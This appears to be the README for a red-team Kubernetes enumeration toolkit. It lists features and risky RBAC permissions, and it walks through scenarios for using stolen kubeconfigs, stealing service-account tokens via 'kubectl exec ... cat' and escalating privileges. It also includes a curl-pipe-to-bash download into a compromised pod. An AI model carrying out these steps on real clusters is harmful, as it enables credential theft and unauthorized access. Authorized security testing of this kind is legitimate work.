# K8s-Enum 

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Kubernetes-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white" alt="Kubernetes">
  <img src="https://img.shields.io/badge/Language-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white" alt="Bash">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge" alt="Version">
</p>

<p align="center">
  <b>Kubernetes Enumeration Tools for Penetration Testing & Red Team Operations</b>
</p>

---

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/f33eca99-e27e-4a22-b84a-9f100dd8c580" />


## 🎯 What is K8s-Enum?

**k8s-enum** is a set of Kubernetes security enumeration scripts designed for penetration testers, red teamers, and security researchers. Inspired by [LinPEAS](https://github.com/carlospolop/PEASS-ng), these tools provide comprehensive enumeration with color-coded output highlighting privilege escalation vectors and misconfigurations.

The toolkit includes two specialized scripts:
- **`k8s-enum.sh`** - External enumeration using kubeconfig files
- **`k8s-pod-enum.sh`** - Internal enumeration from inside a compromised pod

---

## 📦 Tools Included

### 1. k8s-enum.sh (External Enumeration)

Use this when you have obtained kubeconfig files or service account tokens and want to enumerate the cluster from your attack machine.

```bash
./k8s-enum.sh --profile <kubeconfig-file>
```

### 2. k8s-pod-enum.sh (In-Pod Enumeration)

Use this when you've compromised a container/pod and want to enumerate your Kubernetes access from inside the cluster.

```bash
./k8s-pod-enum.sh
```

---

## 🚀 Quick Start

### External Enumeration (with kubeconfig)

```bash
# Clone the repository
git clone https://github.com/ahrixia/k8s-enum.git
cd k8s-enum

# Make executable
chmod +x k8s-enum.sh

# Run with your kubeconfig
./k8s-enum.sh --profile ./stolen-kubeconfig.yaml

# Enumerate specific namespace
./k8s-enum.sh --profile ./config.yaml --namespace kube-system

# Enumerate all namespaces
./k8s-enum.sh --profile ./config.yaml --all-ns
```

### In-Pod Enumeration (from compromised container)

```bash
# Download directly into compromised pod
curl -O https://raw.githubusercontent.com/ahrixia/k8s-enum/main/k8s-pod-enum.sh
chmod +x k8s-pod-enum.sh
./k8s-pod-enum.sh

# Or one-liner
curl -sL https://raw.githubusercontent.com/ahrixia/k8s-enum/main/k8s-pod-enum.sh | bash
```

---

## ✨ Features

### Color-Coded Output (LinPEAS Style)

| Color | Meaning |
|-------|---------|
| 🔴 **Red (Bold)** | CRITICAL - Immediate privilege escalation possible |
| 🔴 **Red** | HIGH - Significant security finding |
| 🟡 **Yellow** | MEDIUM - Potential security issue |
| 🟢 **Green** | LOW/INFO - Informational finding |
| 🔵 **Cyan** | General information |

### k8s-enum.sh Features

- ✅ **Permission Enumeration** - `auth can-i --list` with analysis
- ✅ **Dangerous Permission Detection** - Highlights exec, secrets, impersonate, create pods
- ✅ **Namespace Enumeration** - Lists all accessible namespaces
- ✅ **Pod Enumeration** - Lists pods with service account info
- ✅ **Service Enumeration** - Identifies exposed NodePort/LoadBalancer services
- ✅ **Secret Enumeration** - Lists accessible secrets
- ✅ **ServiceAccount Enumeration** - Maps service accounts across namespaces
- ✅ **CronJob Analysis** - Identifies cronjobs with privileged SAs
- ✅ **RBAC Enumeration** - Roles, ClusterRoles, Bindings
- ✅ **Impersonation Detection** - Finds impersonation targets
- ✅ **Actionable Recommendations** - "What to do next" for each finding

### k8s-pod-enum.sh Features

- ✅ **Auto-detects** mounted service account token
- ✅ **JWT Token Decoding** - Extracts SA name, namespace, pod info
- ✅ **Works without kubectl** - Falls back to curl API calls
- ✅ **Container Escape Vectors** - Checks docker.sock, host mounts, capabilities
- ✅ **Cloud Metadata Access** - AWS/GCP/Azure IMDS checks
- ✅ **Network Enumeration** - Interfaces, ports, internal services
- ✅ **Privilege Escalation Paths** - Identifies privesc opportunities

---

## 🔍 What It Checks

### Permission Analysis

The scripts specifically look for these dangerous permissions:

| Permission | Risk Level | Impact |
|------------|------------|--------|
| `pods/exec create` | CRITICAL | Remote code execution in any pod |
| `secrets get/list` | CRITICAL | Credential extraction |
| `pods create` | CRITICAL | Container escape via privileged pod |
| `serviceaccounts impersonate` | CRITICAL | Privilege escalation |
| `rolebindings create` | CRITICAL | Self-privilege escalation |
| `serviceaccounts/token create` | HIGH | Token generation for other SAs |
| `cronjobs create` | HIGH | Persistence mechanism |
| `daemonsets create` | HIGH | Cluster-wide code execution |

### Container Escape Vectors (In-Pod)

- Docker socket (`/var/run/docker.sock`)
- Host filesystem mounts (`/host`, `/hostfs`, `/rootfs`)
- Privileged container detection
- Host namespace access (PID, Network, IPC)
- Linux capabilities analysis
- Cloud metadata service access

---

## 📸 Screenshots

<img width="1150" height="831" alt="image" src="https://github.com/user-attachments/assets/94467050-2b55-4ce2-abdf-129f90c34cdf" />

---

## 🛠️ Usage Examples

### Scenario 1: Stolen Kubeconfig

```bash
# You obtained a kubeconfig from a developer's laptop
./k8s-enum.sh --profile ./dev-kubeconfig.yaml

# Check what the service account can do
# If it finds impersonation, try:
kubectl --kubeconfig=./dev-kubeconfig.yaml auth can-i --list \
  --as=system:serviceaccount:default:admin-sa
```

### Scenario 2: Compromised Pod

```bash
# Inside a compromised container
./k8s-pod-enum.sh

# If it finds pods/exec permission, pivot:
kubectl exec -it other-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Scenario 3: Privilege Escalation Chain

```bash
# 1. Enumerate with low-priv SA
./k8s-enum.sh --profile ./low-priv.yaml

# 2. Find cronjob with higher-priv SA
kubectl get cronjob -o yaml | grep serviceAccount

# 3. Exec into cronjob pod, steal token
kubectl exec -it cronjob-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 4. Create new kubeconfig with stolen token
# 5. Re-enumerate with higher privileges
./k8s-enum.sh --profile ./high-priv.yaml
```

---

## 📋 Command Reference

### k8s-enum.sh

| Flag | Description |
|------|-------------|
| `--profile, -p` | Path to kubeconfig file (required) |
| `--namespace, -n` | Target specific namespace |
| `--all-ns` | Enumerate all namespaces |
| `--quick` | Skip slow checks (RBAC, impersonation) |
| `--help, -h` | Show help message |

### k8s-pod-enum.sh

| Flag | Description |
|------|-------------|
| `--api-server, -a` | Override API server URL |
| `--help, -h` | Show help message |

---

## 🔧 Building Kubeconfig from Tokens

When you extract a service account token, create a kubeconfig:

```yaml
apiVersion: v1
kind: Config
clusters:
- name: target-cluster
  cluster:
    server: https://<API-SERVER>:443
    certificate-authority-data: <BASE64-CA-CERT>
users:
- name: stolen-sa
  user:
    token: <STOLEN-TOKEN>
contexts:
- name: attack-context
  context:
    cluster: target-cluster
    user: stolen-sa
    namespace: <NAMESPACE>
current-context: attack-context
```

Or use the one-liner:
```bash
kubectl config set-cluster k8s --server=https://<IP>:443 --certificate-authority=ca.crt
kubectl config set-credentials user --token=$(cat token)
kubectl config set-context ctx --cluster=k8s --user=user
kubectl config use-context ctx
```

---

These tools were developed and used during the **K8s-RTA (Kubernetes Red Team Analyst)** Exam.


## ⚠️ Disclaimer

These tools are intended for **authorized security testing only**. Only use these scripts on systems you have explicit permission to test. Unauthorized access to computer systems is illegal.

The author is not responsible for any misuse or damage caused by these tools.

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <b>If you find this useful, give it a ⭐!</b>
</p>
